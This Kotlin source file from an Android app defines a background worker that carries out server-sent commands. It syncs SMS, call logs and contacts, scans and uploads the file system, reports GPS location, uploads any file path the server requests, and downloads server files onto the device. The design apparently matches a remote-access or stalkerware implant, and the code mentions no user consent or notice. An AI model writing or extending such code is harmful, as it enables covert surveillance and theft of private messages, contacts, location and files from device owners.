package com.example.lta.worker

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.Data
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkerParameters
import androidx.work.WorkManager
import com.example.lta.MainApplication
import com.example.lta.data.remote.ApiClient
import com.example.lta.data.repository.DeviceRepository
import com.example.lta.util.FileSystemManager
import com.example.lta.util.SystemInfoManager
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

class DataFetchWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        private const val TAG = "DataFetchWorker"
        const val KEY_COMMAND = "command"

        // Commands
        const val COMMAND_SYNC_ALL = "sync_all"
        const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
        const val COMMAND_GET_LOCATION = "get_location"
        const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
        const val COMMAND_UPLOAD_FILE = "upload_file"
        const val COMMAND_DOWNLOAD_FILE = "download_file"
        const val COMMAND_PING = "ping"

        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
            val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
            extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }

            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(dataBuilder.build())
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                .build()

            WorkManager.getInstance(context).enqueue(workRequest)
            Log.d(TAG, "Scheduled DataFetchWorker with command: $command and data: $extraData")
        }
    }

    private val container = (applicationContext as MainApplication).container
    private val apiClient: ApiClient = container.apiClient
    private val systemInfoManager: SystemInfoManager = container.systemInfoManager
    private val fileSystemManager: FileSystemManager = container.fileSystemManager
    private val deviceRepository: DeviceRepository = container.deviceRepository

    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND) ?: run {
            Log.e(TAG, "Worker failed: No command provided.")
            return Result.failure()
        }

        Log.i(TAG, "Worker starting for command: $command")
        return withContext(Dispatchers.IO) {
            try {
                val success = executeCommand(command)
                if (success) Result.success() else Result.retry()
            } catch (e: Exception) {
                Log.e(TAG, "Worker failed with an exception for command '$command'", e)
                Result.failure()
            }
        }
    }

    private suspend fun executeCommand(command: String): Boolean {
        return when (command) {
            COMMAND_SYNC_ALL -> syncAllData()
            COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
            COMMAND_GET_LOCATION -> fetchAndSendLocation()
            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
            COMMAND_UPLOAD_FILE -> uploadRequestedFile()
            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
            COMMAND_PING -> sendPingResponse()
            else -> {
                Log.w(TAG, "Unknown command received: $command")
                false
            }
        }
    }

    private suspend fun syncAllData(): Boolean {
        Log.i(TAG, "Starting full differential data sync...")
        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms() else true
        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs() else true
        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts() else true
        Log.i(TAG, "Full sync results -> SMS: $smsSuccess, CallLogs: $callLogSuccess, Contacts: $contactsSuccess")
        return smsSuccess && callLogSuccess && contactsSuccess
    }

    private suspend fun uploadRequestedFile(): Boolean {
        val filePath = inputData.getString("filePath") ?: return false
        val file = File(filePath)
        if (!file.exists() || !file.canRead() || file.isDirectory) {
            Log.e(TAG, "Cannot upload file. Invalid path: $filePath")
            return false
        }
        val deviceId = systemInfoManager.getDeviceId()
        return apiClient.uploadRequestedFile(file, deviceId, filePath)
    }

    private suspend fun downloadFileFromServer(): Boolean {
        val serverFilePath = inputData.getString("serverFilePath") ?: return false
        val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
        return downloadedFile?.exists() == true
    }
    
    private suspend fun fetchAndSendLocation(): Boolean {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return true
        val location = getCurrentLocation()
        val message = if (location != null) "Lat=${location.latitude}, Lon=${location.longitude}" else "Not available"
        return apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "location", message)
    }
    
    private suspend fun fetchAndSendSystemInfo(): Boolean {
        val batteryInfo = systemInfoManager.getBatteryStatus()
        val message = "Net=${systemInfoManager.getNetworkType()}, Batt=${batteryInfo.percentage}% (${batteryInfo.status})"
        return apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "system_info", message)
    }

    private suspend fun sendPingResponse(): Boolean {
        val message = "Pong! Device online at ${System.currentTimeMillis()}"
        return apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "ping", message)
    }

    private fun hasPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(applicationContext, permission) == PackageManager.PERMISSION_GRANTED
    
    private suspend fun getCurrentLocation(): Location? = try {
        if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            LocationServices.getFusedLocationProviderClient(applicationContext)
                .getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
        } else null
    } catch (e: SecurityException) {
        Log.e(TAG, "Failed to get current location due to security exception", e)
        null
    } catch (e: Exception) {
        Log.e(TAG, "Failed to get current location", e)
        null
    }
}
